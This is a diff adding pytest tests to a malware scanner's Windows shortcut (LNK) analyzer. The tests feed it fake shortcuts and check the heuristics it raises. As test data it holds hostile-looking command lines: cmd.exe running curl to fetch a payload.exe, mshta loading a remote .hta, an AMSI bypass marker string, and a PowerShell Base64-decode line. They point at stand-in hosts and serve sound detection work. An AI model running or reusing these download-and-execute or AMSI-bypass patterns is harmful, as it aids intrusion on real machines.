@@ -128,6 +128,9 @@ async def test_indicator_logic_cmd_chain_encoded_and_hidden(
     assert "encoded_command" in types
     assert "hidden_execution" in types
     assert result.features.get("decoded_command") == "Write-Output PWNED"
+    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
+    assert "script.encoded_command_execution" in heuristic_map
+    assert heuristic_map["script.encoded_command_execution"].scope == "lnk"
 
 
 @pytest.mark.asyncio
@@ -275,6 +278,136 @@ async def test_monkeypatched_lnkparse3_parse_path(
 
     assert result.features["target_path"] == "cmd.exe"
     assert result.features["network_path"] == r"\\server\\share\\payload.exe"
+    assert result.features["text_preview"] == (
+        "cmd.exe /c curl http://example.test/a\n"
+        "cmd.exe\n"
+        r"C:\\Users\\Public"
+        "\n"
+        r"\\server\\share\\payload.exe"
+    )
+    assert result.features["download_operations"] == ["curl_or_wget"]
+    assert result.features["exec_operations"] == []
     indicator_types = {str(ind["type"]) for ind in result.indicators}
     assert "network_target" in indicator_types
     assert "download_command" in indicator_types
+    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
+    assert "script.download_execute_chain" not in heuristic_map
+
+
+@pytest.mark.asyncio
+async def test_lnk_downloader_without_post_download_execution_does_not_emit_download_execute_chain(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    file_path = tmp_path / "download-only.lnk"
+    file_path.write_bytes(_build_lnk_header(show_command=1))
+
+    class _FakeLnk:
+        def __init__(self, _path: str) -> None:
+            self.target_path = r"C:\\Windows\\System32\\cmd.exe"
+            self.arguments = r"/c curl http://example.test/payload.exe"
+            self.working_dir = r"C:\\Users\\Public"
+            self.network_path = ""
+
+    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)
+
+    analyzer = LNKAnalyzer()
+    result = await analyzer.analyze(file_path, _ctx(file_path))
+
+    heuristic_keys = {heuristic.key for heuristic in result.heuristics}
+    assert "script.download_execute_chain" not in heuristic_keys
+    assert result.features["download_operations"] == ["curl_or_wget"]
+    assert result.features["exec_operations"] == []
+
+
+@pytest.mark.asyncio
+async def test_lnk_analyze_emits_lolbin_heuristic_from_command_chain(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    file_path = tmp_path / "lolbin.lnk"
+    file_path.write_bytes(_build_lnk_header(show_command=1))
+
+    class _FakeLnk:
+        def __init__(self, _path: str) -> None:
+            self.target_path = r"C:\\Windows\\System32\\mshta.exe"
+            self.arguments = r"https://example.test/payload.hta"
+
+    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)
+
+    analyzer = LNKAnalyzer()
+    result = await analyzer.analyze(file_path, _ctx(file_path))
+
+    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
+    assert "lolbin.execution_chain" in heuristic_map
+    assert heuristic_map["lolbin.execution_chain"].scope == "lnk"
+
+
+@pytest.mark.asyncio
+async def test_lnk_heuristics_use_full_projected_text_beyond_preview_limit(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    file_path = tmp_path / "late-marker.lnk"
+    file_path.write_bytes(_build_lnk_header(show_command=1))
+
+    class _FakeLnk:
+        def __init__(self, _path: str) -> None:
+            self.target_path = r"C:\\Windows\\System32\\cmd.exe"
+            self.arguments = "/c " + ("A" * 1005) + " System.Management.Automation.AmsiUtils"
+            self.working_dir = ""
+            self.network_path = ""
+            self.description = ""
+            self.relative_path = ""
+            self.icon_location = ""
+            self.local_base_path = ""
+
+    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)
+
+    analyzer = LNKAnalyzer()
+    result = await analyzer.analyze(file_path, _ctx(file_path))
+
+    heuristic_keys = {heuristic.key for heuristic in result.heuristics}
+    assert len(str(result.features["text_preview"])) == 1000
+    assert "script.amsi_bypass" in heuristic_keys
+
+
+@pytest.mark.asyncio
+async def test_lnk_projected_encoded_strings_detect_non_enc_markers(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    file_path = tmp_path / "encoded-projected.lnk"
+    file_path.write_bytes(_build_lnk_header(show_command=1))
+    encoded = "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ=="
+
+    class _FakeLnk:
+        def __init__(self, _path: str) -> None:
+            self.target_path = r"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+            self.arguments = (
+                "$x=[Convert]::FromBase64String('" + encoded + "'); Start-Process calc.exe"
+            )
+            self.working_dir = ""
+            self.network_path = ""
+            self.description = ""
+            self.relative_path = ""
+            self.icon_location = ""
+            self.local_base_path = ""
+
+    monkeypatch.setattr("malscan_worker.analyzers.lnk_analyzer._lnk_file_class", _FakeLnk)
+
+    analyzer = LNKAnalyzer()
+    result = await analyzer.analyze(file_path, _ctx(file_path))
+
+    assert result.features["encoded_strings"] == [
+        encoded,
+        "[convert]::frombase64string",
+        "frombase64string",
+    ]
+    heuristic_map = {heuristic.key: heuristic for heuristic in result.heuristics}
+    assert "script.encoded_command_execution" in heuristic_map
+    assert heuristic_map["script.encoded_command_execution"].evidence["encoded_strings"] == (
+        "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==",
+        "[convert]::frombase64string",
+        "frombase64string",
+    )
